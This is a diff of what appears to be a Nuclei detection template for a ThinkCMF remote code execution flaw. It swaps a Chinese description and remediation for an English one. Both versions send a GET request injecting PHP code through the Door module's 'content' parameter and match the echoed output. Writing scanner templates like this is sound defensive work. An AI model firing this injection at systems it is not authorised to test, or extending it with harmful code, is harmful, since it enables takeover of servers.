@@ -1,27 +1,28 @@
 id: thinkcmf-arbitrary-code-execution
+
 info:
-  name: ThinkCMF Arbitrary code execution
-  author:
-  - l0ne1y
-  description: |-
-    ThinkCMF Door 代码执行漏洞
-    ThinkCMF是一款基于PHP+MYSQL开发的中文内容管理框架，底层采用ThinkPHP3.2.3构建，在该漏洞中远程攻击者在无需任何权限情况下，通过构造特定的请求包即可在远程服务器上执行任意代码。
+  name: ThinkCMF - Remote Code Execution
+  author: pikpikcu
   severity: high
-  remediation: |-
-    #### 官方修复方案：
-    升级系统至无漏洞版本，或于官网下载安全补丁。
-    #### 临时修复方案：
-    将 `HomebaseController.class.php` 和 `AdminbaseController.class.php` 类中 `display` 和 `fetch` 函数的修饰符改为 `protected`
-requests:
-- matchers:
-  - type: dsl
-    condition: and
-    dsl:
-    - status_code==200
-    - contains(body,verify)
-    - '!regex(''echo.*?{{verify}}'',body)'
-  path:
-  - '{{BaseURL}}/index.php?g=g&m=Door&a=index&content=<?php%20echo%20{{verify}};'
-  method: GET
-variables:
-  verify: '{{rand_text_alphanumeric(8,"")}}'
+  description: ThinkCMF is susceptible to remote code execution. An attacker can execute malware, obtain sensitive information, modify data, and/or gain full control over a compromised system without entering necessary credentials.
+  reference:
+    - https://www.shuzhiduo.com/A/l1dygr36Je/
+  metadata:
+    max-request: 1
+  tags: thinkcmf,rce
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}/index.php?g=g&m=Door&a=index&content=<?php%20echo%20md5('ThinkCMF');"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "d9b2c63a497e2f30c4ad9ad083a00691"
+
+      - type: status
+        status:
+          - 200
+# digest: 4a0a004730450220587155bcc113414f971ad4507715ec3670c7ce07403b3906c5d057b86e12d4f902210083e18abf1fdec7b6bd974ff371b9c93e1de2f210a8f3056575f2948932c1d4a2:922c64590222798bb761d5b6d8e72950
